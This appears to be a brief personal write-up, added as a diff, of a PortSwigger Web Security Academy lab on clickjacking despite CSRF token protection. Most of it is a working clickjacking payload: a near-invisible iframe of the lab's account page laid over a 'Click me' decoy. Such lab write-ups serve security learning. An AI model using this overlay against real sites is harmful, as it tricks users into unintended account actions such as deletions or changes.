@@ -1,0 +1,22 @@
+Basic clickjacking with CSRF token protection
+
+Another one of the Apprentice labs where the solution provided is fantastic. You might have to tweak the exploit a bit.
+Here's what worked for me:
+
+<style>
+   iframe {
+       position:relative;
+       width:700;
+       height: 500;
+       opacity: 0.001;
+       z-index: 2;
+   }
+   div {
+       position:absolute;
+       top:355;
+       left:60;
+       z-index: 1;
+   }
+</style>
+<div>Click me</div>
+<iframe src="https://ac1a1f1c1ebcc67b80461fcb00e3009a.web-security-academy.net/account"></iframe>
